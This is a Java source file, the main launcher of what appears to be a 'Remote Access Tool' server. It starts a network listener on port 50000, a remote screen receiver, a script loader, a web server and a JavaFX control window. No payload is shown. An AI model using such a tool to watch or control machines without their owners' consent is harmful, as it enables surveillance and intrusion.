package electron;

import java.io.File;
import java.net.MalformedURLException;
import java.net.URL;
import electron.networking.Listener;
import electron.networking.ScreenV2Receiver;
import electron.utils.Utils;
import electron.utils.logger;
import electron.web.Loader;
import javafx.application.Application;
import javafx.fxml.FXMLLoader;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.stage.Stage;

public class RAT_server extends Application {
	private static Stage initialStage;
	private static Scene initialScene;

	/**
	 * @author Electron_prod (Alexander Spiridonov)
	 */
	public static void main(String[] args) {
		// Starting network listener
		new Listener(50000).start();
		new ScreenV2Receiver().start();
		Utils.loadDir(new File("scripts"));
		// Launching Web server
		Loader.launch();
		// Launching JavaFX graphics
		launch(args);
	}

	@Override
	public void start(Stage stage) throws Exception {
		// Loading .fxml configuration
		URL url = RAT_server.class.getResource("/resources/mainwindow.fxml");
		logger.log("[Graphics]: loading .fxml config: " + url);
		FXMLLoader loader = new FXMLLoader(url);
		Scene scene = new Scene(loader.load());
		stage.setTitle("Remote Access Tool Server");
		stage.setScene(scene);
		Image img = new Image(RAT_server.class.getResourceAsStream("/resources/appicon.png"));
		stage.getIcons().add(img);
		stage.setOnCloseRequest(event -> {
			logger.log("Closing proram...");
			System.exit(0);
		});
		initialStage = stage;
		initialScene = scene;
		stage.show();
	}

	/**
	 * Get initial JavaFX stage
	 * 
	 * @return
	 */
	public static Stage getInitialStage() {
		return initialStage;
	}

	/**
	 * Get initial JavaFX scene
	 * 
	 * @return
	 */
	public static Scene getInitialScene() {
		return initialScene;
	}
}
